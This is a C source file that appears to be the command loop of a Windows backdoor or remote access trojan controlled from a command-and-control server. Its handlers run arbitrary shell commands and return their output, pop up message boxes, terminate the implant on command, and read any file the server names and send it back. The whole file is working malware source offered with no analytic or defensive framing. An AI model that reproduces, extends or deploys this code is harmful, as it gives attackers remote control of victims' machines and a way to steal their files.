#include <windows.h>
#include "cnc.h"
#include "echo.h"
#include "shell.h"
#include "msgbox.h"
#include "logger.h"
#include "file.h"
#include "commander.h"

void handle_echo()
{
    int bytes_read, bytes_to_read;
    struct echo_cmd cmd;

    log_info("Received ECHO command.");
    bytes_read = recv_cnc(&cmd.bytes_remaining, sizeof(cmd.bytes_remaining));
    if (bytes_read != sizeof(cmd.bytes_remaining))
    {
        log_error("Received invalid text length.");
        return;
    }
    while (cmd.bytes_remaining)
    {
        bytes_to_read = min(cmd.bytes_remaining, sizeof(cmd.data));
        bytes_read = recv_cnc(cmd.data, bytes_to_read);
        cmd.bytes_remaining -= bytes_read;
        if (send_cnc(cmd.data, bytes_read) != bytes_read)
        {
            log_error("Failed to echo the data.");
            return;
        }
    }
}

void handle_shell()
{
    unsigned int bytes_read;
    struct shell_cmd cmd;

    log_info("Received SHELL command.");
    bytes_read = recv_cnc(&cmd.cmd_len, sizeof(cmd.cmd_len));
    if (bytes_read != sizeof(cmd.cmd_len))
    {
        log_error("Received invalid command length.");
        return;
    }
    cmd.cmd = malloc(cmd.cmd_len + 1);
    if (!cmd.cmd)
    {
        log_error("Failed to allocate memory for the command.");
        return;
    }
    bytes_read = recv_cnc(cmd.cmd, cmd.cmd_len);
    if (bytes_read != cmd.cmd_len)
    {
        log_error("Received invalid command.");
        return;
    }
    cmd.cmd[cmd.cmd_len] = 0;
    log_info("Command: \"%s\"", cmd.cmd);
    shell(&cmd);
    while (TRUE)
    {
        bytes_read = read_shell_output(&cmd);
        if (bytes_read)
        {
            send_cnc(&bytes_read, sizeof(bytes_read));
            send_cnc(cmd.out, bytes_read);
        }
        else if (WaitForSingleObject(cmd.proc_info.hProcess, 0) == WAIT_OBJECT_0)
        {
            send_cnc(&bytes_read, sizeof(bytes_read));
            close_shell_process(&cmd);
            send_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
            return;
        }
    }
}

void handle_msgbox()
{
    unsigned int bytes_read;
    struct msgbox_cmd cmd;

    log_info("Received MSGBOX command.");

    bytes_read = recv_cnc(&cmd.title_len, sizeof(cmd.title_len));
    if (bytes_read != sizeof(cmd.title_len))
    {
        log_error("Received invalid title length.");
        return;
    }
    cmd.title = malloc(cmd.title_len + 1);
    if (!cmd.title)
    {
        log_error("Failed to allocate memory for the title.");
        return;
    }
    bytes_read = recv_cnc(cmd.title, cmd.title_len);
    if (bytes_read != cmd.title_len)
    {
        log_error("Received invalid title.");
        return;
    }
    cmd.title[cmd.title_len] = 0;

    bytes_read = recv_cnc(&cmd.text_len, sizeof(cmd.text_len));
    if (bytes_read != sizeof(cmd.text_len))
    {
        log_error("Received invalid text length.");
        return;
    }
    cmd.text = malloc(cmd.text_len + 1);
    if (!cmd.text)
    {
        log_error("Failed to allocate memory for the text.");
        return;
    }
    bytes_read = recv_cnc(cmd.text, cmd.text_len);
    if (bytes_read != cmd.text_len)
    {
        log_error("Received invalid text.");
        return;
    }
    cmd.text[cmd.text_len] = 0;

    log_info("Title: \"%s\", Text: \"%s\"", cmd.title, cmd.text);
    MessageBox(NULL, cmd.text, cmd.title, MB_OK);
    free(cmd.title);
    free(cmd.text);
}

void handle_suicide()
{
    log_info("Received SUICIDE command.");
    exit(EXIT_SUCCESS);
}

void handle_upload_file()
{
    int ret;
    unsigned long bytes_read;
    HANDLE file;
    struct upload_file_cmd cmd;

    log_info("Received UPLOAD_FILE command.");

    bytes_read = recv_cnc(&cmd.local_path_len, sizeof(cmd.local_path_len));
    if (bytes_read != sizeof(cmd.local_path_len))
    {
        log_error("Failed to read file path length.");
        return;
    }
    cmd.local_path = malloc(cmd.local_path_len + 1);

    bytes_read = recv_cnc(cmd.local_path, cmd.local_path_len);
    if (bytes_read != cmd.local_path_len)
    {
        log_error("Failed to read local file path.");
        return;
    }
    cmd.local_path[cmd.local_path_len] = 0;
    log_debug("local path: %s", cmd.local_path);

    file = CreateFile(cmd.local_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    free(cmd.local_path);
    if (file == INVALID_HANDLE_VALUE)
        ret = GetLastError();
    else
        ret = 0;

    bytes_read = send_cnc(&ret, sizeof(ret));
    if (bytes_read != sizeof(ret))
        fatal_error("Failed to send return code of CreateFile.");

    if (ret)
        return;

    cmd.file_size = GetFileSize(file, NULL);
    log_debug("file size: %u", cmd.file_size);
    if (cmd.file_size == INVALID_FILE_SIZE)
        fatal_error("Failed to get the file's size.");
    bytes_read = send_cnc(&cmd.file_size, sizeof(cmd.file_size));
    if (bytes_read != sizeof(cmd.file_size))
        fatal_error("Failed to send file size.");

    while (TRUE)
    {
        ret = ReadFile(file, cmd.file_chunk, sizeof(cmd.file_chunk), &bytes_read, NULL);
        if (!bytes_read)
        {
            CloseHandle(file);
            return;
        }
        if (send_cnc(cmd.file_chunk, bytes_read) != bytes_read)
            fatal_error("Failed to send file chunk.");
    }
}

void listen_for_cmds()
{
    int bytes_read;
    struct cmd cmd;
    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file};

    while (TRUE)
    {
        log_info("Waiting for command.");
        bytes_read = recv_cnc(&cmd, sizeof(struct cmd));
        if (bytes_read != sizeof(struct cmd))
        {
            log_error("Received invalid command.");
            continue;
        }
        cmd_type_handler[cmd.type]();
    }
}
